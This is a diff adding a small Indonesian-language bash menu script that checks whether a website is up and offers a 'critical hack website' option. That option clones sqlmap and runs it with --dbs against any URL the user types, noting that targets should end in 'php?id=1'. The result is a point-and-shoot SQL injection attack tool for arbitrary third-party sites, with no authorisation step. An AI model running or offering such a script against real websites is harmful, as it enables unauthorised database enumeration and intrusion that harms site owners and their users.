@@ -1,0 +1,81 @@
+#!/bin/bash
+   clear
+   echo "ARC_site"
+   echo "[==[v1.0i]===]]"
+   date
+   echo ":::::::::::::::"
+   echo " "
+   echo "+[1] cek apakah website masih aktif"
+   echo "+[2] critical hack website"
+   echo "+[3] update"
+   echo "+[4] uninstall"
+   read -p "pilih nomor :" pil;
+       case $pil in
+
+1)
+
+   clear
+   echo "[masukkan link website]"
+   read weblink
+   apt install tracepath
+   traceroute $weblink
+   echo "jika hasil tidak error artinya website masih aktif"
+
+;;
+
+2)
+
+   clear
+   echo "menginstall sqlmap..."
+
+   apt install git
+
+   git clone https://github.com/sqlmapproject/sqlmap
+
+   apt install python -y
+   apt install python2 -y
+
+   cd sqlmap
+   clear
+
+   echo "untuk hack situs ujung situs harus ada [php?id=1]"
+   
+   clear
+   echo "masukkan link website"
+   read weblink1
+   python2 sqlmap.py $weblink1 --dbs
+
+;;
+
+3)
+
+  clear
+  echo "updating..."
+  cd  
+  cd
+  rm -r arcsite
+  git clone https://github.com/afri64/arcsite
+
+;;
+
+4)
+  
+  clear
+  echo "uninstalling.."
+  cd
+  cd
+  rm -r arcsite
+  clear
+  echo "uninstallation complete"
+
+;;
+
+*)
+
+  echo "typo ,kepencet ato gmn ngab?:V"
+  
+;;
+
+esac
+
+ 
